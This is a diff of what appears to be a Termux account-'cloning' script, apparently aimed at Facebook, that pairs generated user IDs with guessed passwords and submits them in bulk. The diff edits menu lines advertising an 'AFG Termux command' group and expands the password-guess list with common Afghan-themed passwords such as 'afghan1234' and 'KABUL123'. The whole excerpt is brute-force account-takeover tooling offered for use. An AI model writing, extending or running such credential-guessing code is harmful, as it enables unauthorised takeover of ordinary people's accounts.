@@ -591,8 +591,8 @@ def main():
     print(f"\033[1;97m[+] \033[1;92mNAME \033[1;91m: \033[1;96m{NameX}")
     print('\033[1;32m--------------------------------------------------------------') 
     print(f"\033[1;97m[01] \033[1;92mSTART CLONING")
-    print(f"\033[1;97m[02] \033[JOIN TO AFG Termux command FB group")
-    print(f"\033[1;97m[03] \033[JOIN TO AFG TERMUX COMMAND TELEGRAM")
+    print(f"\033[1;97m[02] \033[ JOIN TO AFG TERMUX COMMAND FB group")
+    print(f"\033[1;97m[03] \033[ JOIN TO AFG TERMUX COMMAND TELEGRAM")
     print(f"\033[1;97m[00] \033[1;92mEXIT ")
     print('\033[1;32m--------------------------------------------------------------') 
     mirwais = input("\033[1;37m[\033[1;31m!\033[1;37m]\033[1;32m SELECT \033[1;37m: \033[1;36m")
@@ -742,7 +742,7 @@ def awm1():
         print('\033[1;32m--------------------------------------------------------------') 
         for love in user:
             uid = code+love
-            pwx = [love,'afghan12345', 'afghan1234', 'khan1234']
+            pwx = [love,'afghan12345', 'afghan1234', 'khan1234', 'KHANKHAN', 'AFGHAN', 'AFGHAN1234', 'AFGHANISTAN', '100200', 'KABUL1234', 'KABUL123', 'AFGHAN123', '1122334455', '786786', '500600', 'khan123', 'Khan1122', 'afgan786', 'afghan1122']
             manshera.submit(freeq,uid,pwx,tl)
     print('')
     print('\033[1;32m--------------------------------------------------------------') 
